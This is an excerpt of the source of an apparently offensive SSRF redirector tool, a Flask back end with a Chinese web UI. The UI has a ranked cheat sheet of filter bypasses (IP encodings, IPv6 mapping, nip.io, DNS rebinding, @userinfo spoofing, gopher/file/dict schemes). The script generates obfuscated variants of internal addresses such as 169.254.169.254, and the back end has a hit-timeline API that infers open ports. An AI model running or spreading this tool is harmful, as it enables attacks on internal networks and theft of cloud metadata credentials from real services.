...
<body>
    <div class="container">
        <div class="header">
            ...
            <p>云原生穿透引擎 · K8s/Docker 307无损引流 · Gopher封装 · 批量队列投递 · Burp风格编辑器 · HEAD伪装绕过 · 降级跳转 · 命中时间轴 · SSRF绕过助手</p>
        </div>
        <div class="stats">
                ...
                <div id="tab-basic" class="tab-content active">
                    ...
                    <div class="bypass-panel" id="bypassPanel" style="display:none;">
                        ...
                        <div class="bypass-tips">
                            <b>💡 绕过思路速查 (按优先级尝试)：</b><br>
                            ① 本工具的 30x / 降级跳转 —— 绕过"发起前校验URL"类过滤<br>
                            ② IP 进制变形 / 短格式 / 零填充 / 圈数字 —— 绕过正则类黑名单<br>
                            ③ IPv6 映射 / 兼容格式 —— 绕过仅匹配IPv4的校验<br>
                            ④ nip.io / sslip.io / localtest.me —— 域名解析指向内网, 绕过主机名黑名单<br>
                            ⑤ DNS Rebinding —— 对抗"解析后校验IP再请求"的目标 (需自建双A记录DNS)<br>
                            ⑥ @userinfo / #fragment / 多重编码 —— 利用URL解析器差异混淆<br>
                            ⑦ 协议替换 dict:// gopher:// file:// netdoc:// —— 绕过协议白名单薄弱点
                        </div>
                    </div>
    ...
    <script>
        ...
        function buildBypassUrl(host, port, path) {
        ...
        function generateBypassVariants() {
            ...
            if (parts.length !== 4 || parts.some(p => !/^\\d{1,3}$/.test(p) || +p > 255)) {
                alert('❌ 请输入合法的 IPv4 地址 (如 127.0.0.1 或 169.254.169.254)');
                return;
            }
            ...
            const hexDotted = n.map(x => '0x' + x.toString(16)).join('.');
            const octDotted = n.map(x => '0' + x.toString(8)).join('.');
            const encDigits = '⓪①②③④⑤⑥⑦⑧⑨';
            const enclosed = ip.split('').map(ch => /\\d/.test(ch) ? encDigits[+ch] : ch).join('');
            const variants = [
                ['原始形式', ip],
                ['十进制整型', String(long)],
                ...
                ['点分十六进制', hexDotted],
                ['点分八进制', octDotted],
                ['混合格式', '0x' + n[0].toString(16) + '.' + rest3],
                ['短格式 a.n', n[0] + '.' + rest3],
                ['短格式 a.b.n', n[0] + '.' + n[1] + '.' + rest2],
                ['IPv6 映射', '[::ffff:' + ip + ']'],
                ['IPv6映射hex', '[::ffff:' + (n[0] * 256 + n[1]).toString(16) + ':' + (n[2] * 256 + n[3]).toString(16) + ']'],
                ['IPv6 兼容', '[::' + ip + ']'],
                ['末尾加点', ip + '.'],
                ['零填充(部分解析器按八进制处理)', n.map(x => String(x).padStart(3, '0')).join('.')],
                ['圈数字(部分解析器)', enclosed],
                ['nip.io 域名', ip + '.nip.io'],
                ['sslip.io 域名', ip + '.sslip.io'],
                ['@用户信息欺骗', domain + '@' + ip],
            ];
            if (ip === '127.0.0.1') {
                variants.push(['localtest.me', 'localtest.me']);
                variants.push(['零 (Linux本机)', '0']);
            }
            const box = document.getElementById('bypassVariants');
            box.innerHTML = variants.map(v => {
                const full = buildBypassUrl(v[1], port, path);
                return `<span class="variant-chip" data-url="${escapeHtml(full)}" title="${escapeHtml(full)}" onclick="fillBypassTarget(this)"><span class="vlabel">${escapeHtml(v[0])}</span>${escapeHtml(v[1])}</span>`;
            }).join('');
        }
        ...
        async function refreshTimeline() {
            ...
            try {
                const res = await fetch(`/api/hit_analysis?chain_id=${encodeURIComponent(chainId)}&threshold_ms=${encodeURIComponent(thr || '0')}`);
                const data = await res.json();
                ...
                box.innerHTML = visibleLogs.map(l => {
                    ...
                    <div class="log-entry ${headBypassClass}" data-logid="${l.id}" onclick="const ext=this.querySelector('.log-ext');ext.style.display=ext.style.display==='none'?'block':'none';">
                        ...
                        <div class="log-header">
                            ...
                            <span><span class="method-badge ${mClass}">${safeMethod}</span>${headBadge}${fbBadge}<span style="color:var(--text-muted);font-size:12px;">${safeTime}</span></span>
                        </div>
...
def create_stateful_chain():
    ...
    for step in steps_input:
        ...
        reserved = ['/', '/r', '/c', '/api/logs', '/api/create_stateful_chain', '/api/stateful_chains', '/api/hit_analysis']
...
# ==================== 命中时间轴分析 API ====================
@app.route('/api/hit_analysis', methods=['GET'])
def hit_analysis():
    """
    命中时间轴 + 端口开放启发式推断:
...
if __name__ == '__main__':
    print(f"🚀 SSRF 实战 30x Redirector 引擎启动成功 (v1.5)")
    ...
    print(f"🧩 SSRF绕过助手已启用 (IP变形/IPv6/短格式/nip.io/@欺骗 一键生成)")
